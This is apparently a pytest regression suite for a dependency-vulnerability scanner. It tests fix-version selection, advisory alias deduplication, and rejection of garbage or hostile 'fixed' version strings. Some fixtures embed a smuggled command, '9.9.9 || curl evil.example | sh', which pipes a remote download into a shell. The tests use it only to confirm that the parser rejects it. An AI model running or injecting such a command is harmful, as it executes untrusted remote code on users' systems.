"""Regressions for issues surfaced by the live raptor-repo run."""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path
from typing import List

import pytest

from packages.sca.findings import build_vuln_findings
from packages.sca.models import (
    AffectedRange,
    Advisory,
    CVSSScore,
    Confidence,
    Dependency,
    PinStyle,
)
from packages.sca.osv import OsvResult


def _dep(version: str = "2.0.0", name: str = "pydantic",
         ecosystem: str = "PyPI") -> Dependency:
    return Dependency(
        ecosystem=ecosystem, name=name, version=version,
        declared_in=Path("/repo/x"), scope="main", is_lockfile=False,
        pin_style=PinStyle.EXACT, direct=True,
        purl=f"pkg:{ecosystem.lower()}/{name}@{version}",
        parser_confidence=Confidence("high", reason="t"),
    )


def _adv(
    osv_id: str,
    fixed: List[str],
    aliases: List[str] | None = None,
) -> Advisory:
    return Advisory(
        osv_id=osv_id,
        aliases=aliases or [],
        summary="t",
        details="",
        affected=[AffectedRange(
            type="ECOSYSTEM",
            events=[{"introduced": "0"}, *[{"fixed": v} for v in fixed]],
        )],
        severity=CVSSScore(
            score=5.5,
            vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            severity="medium",
        ),
        fixed_versions=fixed,
        references=[],
        published=datetime(2024, 1, 1, tzinfo=timezone.utc),
    )


# ---------------------------------------------------------------------------
# _smallest_applicable_fix
# ---------------------------------------------------------------------------

def test_fix_picks_upgrade_above_installed_version() -> None:
    """Pydantic 2.0.0 with two non-overlapping fix versions (1.10.13 +
    2.4.0): the right upgrade is 2.4.0, not the global minimum 1.10.13."""
    dep = _dep(version="2.0.0", name="pydantic")
    adv = _adv("GHSA-x", fixed=["1.10.13", "2.4.0"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [adv])],
    )
    assert findings[0].fixed_version == "2.4.0"


def test_fix_falls_back_when_installed_above_all_fixes() -> None:
    """Operator already runs past every published fix — emit the global
    minimum so the report still has *something*."""
    dep = _dep(version="9.99.0", name="pydantic")
    adv = _adv("GHSA-x", fixed=["1.10.13", "2.4.0"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [adv])],
    )
    assert findings[0].fixed_version == "1.10.13"


def test_fix_single_value_used_directly() -> None:
    dep = _dep(version="1.0", name="x")
    adv = _adv("GHSA-x", fixed=["2.0"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [adv])],
    )
    assert findings[0].fixed_version == "2.0"


def test_fix_handles_unknown_ecosystem_comparator() -> None:
    """For an ecosystem we don't know how to order, fall back to OSV order."""
    dep = _dep(version="1.0", name="x", ecosystem="Hex")
    adv = _adv("GHSA-x", fixed=["2.5", "2.0"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [adv])],
    )
    assert findings[0].fixed_version in ("2.0", "2.5")


# ---------------------------------------------------------------------------
# Group-max fix combining — parseable candidates outrank unparseable
# ---------------------------------------------------------------------------

# EVERY ecosystem with a registered comparator, enumerated from the
# registry itself so a newly-registered comparator cannot dodge the
# hijack coverage (a hand-named list previously covered only
# npm/crates.io/Go/PyPI — the never-raise comparators stayed
# hijackable for years). Values are per-ecosystem realistic version
# fixtures: (installed, low_fix, high_fix), ordered low < high and
# installed < both under that ecosystem's semantics.
_ECOSYSTEM_FIXTURES: dict[str, tuple[str, str, str]] = {
    "npm": ("2.0.0", "2.1.0", "2.4.0"),
    "Cargo": ("2.0.0", "2.1.0", "2.4.0"),
    "Go": ("2.0.0", "2.1.0", "2.4.0"),
    "PyPI": ("2.0.0", "2.1.0", "2.4.0"),
    "Maven": ("2.0.0", "2.1.0", "2.4.0"),
    "RubyGems": ("2.0.0", "2.1.0", "2.4.0"),
    "NuGet": ("2.0.0", "2.1.0", "2.4.0"),
    "Packagist": ("2.0.0", "2.1.0", "2.4.0"),
    "Debian": ("2.0.0-1", "2.1.0-1", "2.4.0-1"),
    "Alpine": ("2.0.0-r0", "2.1.0-r0", "2.4.0-r0"),
    "Red Hat": ("2.0.0-1.el8", "2.1.0-1.el8", "2.4.0-1.el8"),
    "GitHub Actions": ("2.0.0", "2.1.0", "2.4.0"),
    "ConanCenter": ("2.0.0", "2.1.0", "2.4.0"),
    "vcpkg": ("2.0.0", "2.1.0", "2.4.0"),
}

_ALL_ECOSYSTEMS = sorted(_ECOSYSTEM_FIXTURES)

# Alias spellings must inherit the same protection as their canonical
# ecosystem (OSV and parsers disagree on spelling).
_ALIAS_SPOT_CHECKS = ("crates.io", "gem", "apt", "composer", "rpm")


def _fixtures_for(ecosystem: str) -> tuple[str, str, str]:
    from packages.sca.versions import _canonical_ecosystem

    return _ECOSYSTEM_FIXTURES[_canonical_ecosystem(ecosystem)]


def test_hijack_fixtures_cover_every_registered_comparator() -> None:
    """Enumeration guard: registering a comparator without adding a
    hijack fixture must fail this test — no more named-list
    under-coverage."""
    from packages.sca.versions import _comparators

    assert set(_ECOSYSTEM_FIXTURES) == set(_comparators)


@pytest.mark.parametrize("ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
def test_group_max_prefers_parseable_fix_over_git_sha(
    ecosystem: str,
) -> None:
    """Alias-merged group where one advisory carries only a GIT-range
    ``fixed`` event (a commit SHA — routine in OSS-Fuzz-sourced OSV
    records): the parseable sibling's fix must win the group-max
    combine, not the unparseable SHA. Covers every registered
    comparator — including the never-raise ones (Maven / Packagist /
    Debian / Red Hat), where the SHA compared HIGHER than any real
    version and hijacked the combine for years."""
    installed, _low, high = _fixtures_for(ecosystem)
    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
    good = _adv("GHSA-good", fixed=[high],
                aliases=["CVE-2024-0001"])
    sha = _adv("GHSA-shaonly",
               fixed=["3f2b1c0d9e8a7f6b5c4d3e2f1a0b9c8d7e6f5a4b"],
               aliases=["CVE-2024-0001"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [good, sha])],
    )
    assert len(findings) == 1
    assert findings[0].fixed_version == high


@pytest.mark.parametrize(
    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
def test_group_max_hostile_fixed_string_never_wins(
    ecosystem: str,
) -> None:
    """A crafted advisory whose ``fixed`` entry is arbitrary attacker
    text must not hijack fixed_version away from a parseable sibling."""
    installed, _low, high = _fixtures_for(ecosystem)
    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
    good = _adv("GHSA-good", fixed=[high],
                aliases=["CVE-2024-0003"])
    hostile = _adv("GHSA-hostile", fixed=["~pwned-not-a-version"],
                   aliases=["CVE-2024-0003"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [good, hostile])],
    )
    assert len(findings) == 1
    assert findings[0].fixed_version == high


@pytest.mark.parametrize(
    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
def test_group_max_still_takes_highest_parseable_fix(
    ecosystem: str,
) -> None:
    """The conservative direction is unchanged: between two parseable
    per-advisory fixes, the HIGHER one wins (an attacker-lowered fix
    version is not adopted)."""
    installed, low, high = _fixtures_for(ecosystem)
    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
    low_adv = _adv("GHSA-low", fixed=[low], aliases=["CVE-2024-0002"])
    high_adv = _adv("GHSA-high", fixed=[high], aliases=["CVE-2024-0002"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [low_adv, high_adv])],
    )
    assert len(findings) == 1
    assert findings[0].fixed_version == high


@pytest.mark.parametrize(
    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
def test_parse_probe_rejects_garbage_per_ecosystem(
    ecosystem: str,
) -> None:
    """The probe must reject non-versions for EVERY ecosystem — via
    the real parser where the comparator raises, via the plausibility
    floor where the comparator orders arbitrary strings by design."""
    from packages.sca.findings import _is_parseable_version

    _installed, _low, high = _fixtures_for(ecosystem)
    assert _is_parseable_version(ecosystem, high) is True
    assert _is_parseable_version(
        ecosystem, "~pwned-not-a-version") is False
    # Letter-led and digit-led SHAs both: the digit-led one defeats a
    # naive "starts with a digit" floor.
    assert _is_parseable_version(
        ecosystem, "f2b1c0d9e8a7f6b5c4d3e2f1a0b9c8d7e6f5a4b3") is False
    assert _is_parseable_version(
        ecosystem, "3f2b1c0d9e8a7f6b5c4d3e2f1a0b9c8d7e6f5a4b") is False


def test_group_max_all_unparseable_still_surfaces_a_fix() -> None:
    """When EVERY candidate is unparseable there is nothing better to
    prefer — the combine still returns one of them rather than
    crashing or dropping the fix hint."""
    dep = _dep(version="2.0.0", name="pydantic")
    sha = "3f2b1c0d9e8a7f6b5c4d3e2f1a0b9c8d7e6f5a4b"
    adv = _adv("GHSA-shaonly", fixed=[sha])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [adv])],
    )
    assert findings[0].fixed_version == sha


# ---------------------------------------------------------------------------
# Alias dedup
# ---------------------------------------------------------------------------

def test_ghsa_and_pysec_with_same_cve_collapse_to_one_finding() -> None:
    """OSV returns CVE-2023-32681 under both GHSA-j8r2-6x86-q33q AND
    PYSEC-2023-74. Emit one finding, not two."""
    dep = _dep(version="2.28.0", name="requests")
    ghsa = _adv("GHSA-j8r2-6x86-q33q", fixed=["2.31.0"],
                aliases=["CVE-2023-32681", "PYSEC-2023-74"])
    pysec = _adv("PYSEC-2023-74", fixed=["2.31.0"],
                 aliases=["CVE-2023-32681", "GHSA-j8r2-6x86-q33q"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [ghsa, pysec])],
    )
    assert len(findings) == 1
    # GHSA preferred over PYSEC.
    assert findings[0].advisories[0].osv_id.startswith("GHSA-")


def test_distinct_cves_keep_separate_findings() -> None:
    dep = _dep(version="2.28.0", name="requests")
    a = _adv("GHSA-1", fixed=["2.31.0"], aliases=["CVE-A"])
    b = _adv("GHSA-2", fixed=["2.32.0"], aliases=["CVE-B"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [a, b])],
    )
    ids = sorted(f.advisories[0].osv_id for f in findings)
    assert ids == ["GHSA-1", "GHSA-2"]


def test_advisory_without_cve_alias_kept_as_unique() -> None:
    """A pure GHSA without a CVE alias keys on its own ID, so it doesn't
    accidentally collapse into another."""
    dep = _dep(version="1.0", name="x")
    a = _adv("GHSA-no-cve", fixed=["2.0"], aliases=[])
    b = _adv("GHSA-also-no-cve", fixed=["2.0"], aliases=[])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [a, b])],
    )
    assert len(findings) == 2


def test_preference_order_prefers_ghsa_over_cve_over_pysec() -> None:
    dep = _dep(version="1.0", name="x")
    cve_first = _adv("CVE-2023-X", fixed=["2.0"], aliases=["CVE-2023-X"])
    pysec = _adv("PYSEC-2023-X", fixed=["2.0"], aliases=["CVE-2023-X"])
    ghsa = _adv("GHSA-X", fixed=["2.0"], aliases=["CVE-2023-X"])
    # Order in OSV response varies; result must be deterministic.
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [cve_first, pysec, ghsa])],
    )
    assert len(findings) == 1
    assert findings[0].advisories[0].osv_id == "GHSA-X"


@pytest.mark.parametrize(
    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
def test_group_max_range_expression_garbage_never_wins(
    ecosystem: str,
) -> None:
    """A digit-led range-shaped value ("9.9.9 || <garbage>") must not
    ride its first atom past the probe: comparators that tolerate a
    parseable prefix (NuGet's lenient tail segments) reported the
    whole string parseable and it won the combine over a real fix."""
    installed, _low, high = _fixtures_for(ecosystem)
    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
    good = _adv("GHSA-good", fixed=[high], aliases=["CVE-2024-0004"])
    hostile = _adv(
        "GHSA-range",
        fixed=["9.9.9 || curl evil.example | sh"],
        aliases=["CVE-2024-0004"],
    )
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [good, hostile])],
    )
    assert len(findings) == 1
    assert findings[0].fixed_version == high


@pytest.mark.parametrize(
    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
def test_group_max_abbreviated_sha_never_wins(ecosystem: str) -> None:
    """git's DEFAULT abbreviation is 7-12 hex chars — a 12-hex
    shortened commit hash passed the ≥20-char hex floor and won the
    combine on the lenient-comparator ecosystems."""
    installed, _low, high = _fixtures_for(ecosystem)
    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
    good = _adv("GHSA-good", fixed=[high], aliases=["CVE-2024-0005"])
    sha = _adv("GHSA-absha", fixed=["3f2b1c0d9e8a"],
               aliases=["CVE-2024-0005"])
    sha7 = _adv("GHSA-absha7", fixed=["3f2b1c0"],
                aliases=["CVE-2024-0005"])
    findings = build_vuln_findings(
        [dep], [OsvResult(dep.key(), [good, sha, sha7])],
    )
    assert len(findings) == 1
    assert findings[0].fixed_version == high


def test_probe_rejects_review_shapes_and_keeps_datestamps() -> None:
    """Reviewer repro shapes, probe-level: range garbage and the
    abbreviated SHA fail for every ecosystem; pure-decimal
    undelimited datestamps — legitimate Debian/Maven versions that
    are also all-hex-digit strings — stay parseable on the lenient
    floor (the hex rule requires a letter)."""
    from packages.sca.findings import _is_parseable_version

    for eco in _ALL_ECOSYSTEMS:
        assert _is_parseable_version(
            eco, "9.9.9 || curl evil.example | sh") is False, eco
        assert _is_parseable_version(eco, "3f2b1c0d9e8a") is False, eco
        # git's MINIMUM default abbreviation — 7 hex chars.
        assert _is_parseable_version(eco, "3f2b1c0") is False, eco
    for eco in ("Debian", "Maven"):
        assert _is_parseable_version(eco, "20230311") is True, eco
        # Pure-decimal at 7 chars too (letter-bearing-hex-only rule):
        # short decimal datestamp/serial shapes stay admitted.
        assert _is_parseable_version(eco, "2023031") is True, eco
